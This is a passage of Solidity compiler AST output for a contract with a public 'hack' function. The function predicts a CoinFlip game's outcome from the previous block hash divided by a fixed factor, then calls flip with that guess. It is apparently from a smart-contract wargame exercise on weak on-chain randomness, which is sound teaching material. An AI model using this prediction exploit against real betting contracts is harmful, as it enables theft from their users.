										"typeIdentifier": "t_contract$_CoinFlip_$9",
										"typeString": "contract CoinFlip"
									},
									"typeName": {
										"contractScope": null,
										"id": 10,
										"name": "CoinFlip",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 9,
										"src": "156:8:0",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_CoinFlip_$9",
											"typeString": "contract CoinFlip"
										}
									},
									"value": null,
									"visibility": "internal"
								},
								{
									"constant": false,
									"id": 14,
									"mutability": "mutable",
									"name": "FACTOR",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 72,
									"src": "219:94:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 12,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "219:7:0",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": {
										"argumentTypes": null,
										"hexValue": "3537383936303434363138363538303937373131373835343932353034333433393533393236363334393932333332383230323832303139373238373932303033393536353634383139393638",
										"id": 13,
										"isConstant": false,
										"isLValue": false,
										"isPure": true,
										"kind": "number",
										"lValueRequested": false,
										"nodeType": "Literal",
										"src": "236:77:0",
										"subdenomination": null,
										"typeDescriptions": {
											"typeIdentifier": "t_rational_57896044618658097711785492504343953926634992332820282019728792003956564819968_by_1",
											"typeString": "int_const 5789...(69 digits omitted)...9968"
										},
										"value": "57896044618658097711785492504343953926634992332820282019728792003956564819968"
									},
									"visibility": "internal"
								},
								{
									"constant": false,
									"functionSelector": "8475c028",
									"id": 16,
									"mutability": "mutable",
									"name": "side",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 72,
									"src": "319:16:0",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_bool",
										"typeString": "bool"
									},
									"typeName": {
										"id": 15,
										"name": "bool",
										"nodeType": "ElementaryTypeName",
										"src": "319:4:0",
										"typeDescriptions": {
											"typeIdentifier": "t_bool",
											"typeString": "bool"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 27,
										"nodeType": "Block",
										"src": "375:44:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 25,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 21,
														"name": "coin_flip",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 11,
														"src": "385:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_CoinFlip_$9",
															"typeString": "contract CoinFlip"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 23,
																"name": "_addr",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 18,
																"src": "406:5:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															],
															"id": 22,
															"name": "CoinFlip",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 9,
															"src": "397:8:0",
															"typeDescriptions": {
																"typeIdentifier": "t_type$_t_contract$_CoinFlip_$9_$",
																"typeString": "type(contract CoinFlip)"
															}
														},
														"id": 24,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "typeConversion",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "397:15:0",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_CoinFlip_$9",
															"typeString": "contract CoinFlip"
														}
													},
													"src": "385:27:0",
													"typeDescriptions": {
														"typeIdentifier": "t_contract$_CoinFlip_$9",
														"typeString": "contract CoinFlip"
													}
												},
												"id": 26,
												"nodeType": "ExpressionStatement",
												"src": "385:27:0"
											}
										]
									},
									"documentation": null,
									"id": 28,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 19,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 18,
												"mutability": "mutable",
												"name": "_addr",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 28,
												"src": "354:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 17,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "354:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "353:15:0"
									},
									"returnParameters": {
										"id": 20,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "375:0:0"
									},
									"scope": 72,
									"src": "342:77:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 70,
										"nodeType": "Block",
										"src": "447:213:0",
										"statements": [
											{
												"assignments": [
													32
												],
												"declarations": [
													{
														"constant": false,
														"id": 32,
														"mutability": "mutable",
														"name": "blockValue",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 70,
														"src": "457:18:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 31,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "457:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 42,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"arguments": [
																{
																	"argumentTypes": null,
																	"commonType": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"id": 39,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": false,
																	"lValueRequested": false,
																	"leftExpression": {
																		"argumentTypes": null,
																		"expression": {
																			"argumentTypes": null,
																			"id": 36,
																			"name": "block",
																			"nodeType": "Identifier",
																			"overloadedDeclarations": [],
																			"referencedDeclaration": -4,
																			"src": "496:5:0",
																			"typeDescriptions": {
																				"typeIdentifier": "t_magic_block",
																				"typeString": "block"
																			}
																		},
																		"id": 37,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": false,
																		"lValueRequested": false,
																		"memberName": "number",
																		"nodeType": "MemberAccess",
																		"referencedDeclaration": null,
																		"src": "496:12:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"nodeType": "BinaryOperation",
																	"operator": "-",
																	"rightExpression": {
																		"argumentTypes": null,
																		"hexValue": "31",
																		"id": 38,
																		"isConstant": false,
																		"isLValue": false,
																		"isPure": true,
																		"kind": "number",
																		"lValueRequested": false,
																		"nodeType": "Literal",
																		"src": "510:1:0",
																		"subdenomination": null,
																		"typeDescriptions": {
																			"typeIdentifier": "t_rational_1_by_1",
																			"typeString": "int_const 1"
																		},
																		"value": "1"
																	},
																	"src": "496:15:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																}
															],
															"expression": {
																"argumentTypes": [
																	{
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																],
																"id": 35,
																"name": "blockhash",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": -5,
																"src": "486:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_blockhash_view$_t_uint256_$returns$_t_bytes32_$",
																	"typeString": "function (uint256) view returns (bytes32)"
																}
															},
															"id": 40,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"kind": "functionCall",
															"lValueRequested": false,
															"names": [],
															"nodeType": "FunctionCall",
															"src": "486:26:0",
															"tryCall": false,
															"typeDescriptions": {
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bytes32",
																"typeString": "bytes32"
															}
														],
														"id": 34,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "478:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_uint256_$",
															"typeString": "type(uint256)"
														},
														"typeName": {
															"id": 33,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "478:7:0",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 41,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "478:35:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "457:56:0"
											},
											{
												"assignments": [
													44
												],
												"declarations": [
													{
														"constant": false,
														"id": 44,
														"mutability": "mutable",
														"name": "coinFlip",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 70,
														"src": "523:16:0",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 43,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "523:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 54,
												"initialValue": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 52,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 49,
																		"name": "blockValue",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 32,
																		"src": "558:10:0",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	],
																	"id": 48,
																	"isConstant": false,
																	"isLValue": false,
																	"isPure": true,
																	"lValueRequested": false,
																	"nodeType": "ElementaryTypeNameExpression",
																	"src": "550:7:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_type$_t_uint256_$",
																		"typeString": "type(uint256)"
																	},
																	"typeName": {
																		"id": 47,
																		"name": "uint256",
																		"nodeType": "ElementaryTypeName",
																		"src": "550:7:0",
																		"typeDescriptions": {
																			"typeIdentifier": null,
																			"typeString": null
																		}
																	}
																},
																"id": 50,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "typeConversion",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "550:19:0",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "/",
															"rightExpression": {
																"argumentTypes": null,
																"id": 51,
																"name": "FACTOR",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 14,
																"src": "571:6:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "550:27:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 46,
														"isConstant": false,
														"isLValue": false,
														"isPure": true,
														"lValueRequested": false,
														"nodeType": "ElementaryTypeNameExpression",
														"src": "542:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_type$_t_uint256_$",
															"typeString": "type(uint256)"
														},
														"typeName": {
															"id": 45,
															"name": "uint256",
															"nodeType": "ElementaryTypeName",
															"src": "542:7:0",
															"typeDescriptions": {
																"typeIdentifier": null,
																"typeString": null
															}
														}
													},
													"id": 53,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "typeConversion",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "542:36:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "523:55:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 62,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 55,
														"name": "side",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 16,
														"src": "588:4:0",
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"condition": {
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 58,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 56,
																"name": "coinFlip",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 44,
																"src": "595:8:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "==",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "31",
																"id": 57,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "607:1:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_1_by_1",
																	"typeString": "int_const 1"
																},
																"value": "1"
															},
															"src": "595:13:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														"falseExpression": {
															"argumentTypes": null,
															"hexValue": "66616c7365",
															"id": 60,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "bool",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "618:5:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"value": "false"
														},
														"id": 61,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"nodeType": "Conditional",
														"src": "595:28:0",
														"trueExpression": {
															"argumentTypes": null,
															"hexValue": "74727565",
															"id": 59,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "bool",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "611:4:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															"value": "true"
														},
														"typeDescriptions": {
															"typeIdentifier": "t_bool",
															"typeString": "bool"
														}
													},
													"src": "588:35:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 63,
												"nodeType": "ExpressionStatement",
												"src": "588:35:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 67,
															"name": "side",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 16,
															"src": "648:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														],
														"expression": {
															"argumentTypes": null,
															"id": 64,
															"name": "coin_flip",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 11,
															"src": "633:9:0",
															"typeDescriptions": {
																"typeIdentifier": "t_contract$_CoinFlip_$9",
																"typeString": "contract CoinFlip"
															}
														},
														"id": 66,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "flip",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 8,
														"src": "633:14:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_external_nonpayable$_t_bool_$returns$_t_bool_$",
															"typeString": "function (bool) external returns (bool)"
														}
													},
													"id": 68,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "633:20:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"id": 69,
												"nodeType": "ExpressionStatement",
												"src": "633:20:0"
											}
										]
									},
									"documentation": null,
									"functionSelector": "4de260a2",
									"id": 71,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "hack",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 29,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "438:2:0"
									},
									"returnParameters": {
										"id": 30,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "447:0:0"
									},
									"scope": 72,
									"src": "425:235:0",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								}
							],
							"scope": 73,
							"src": "137:526:0"
						}
					],
					"src": "0:663:0"
				},
				"id": 0
			}
		}
	}
}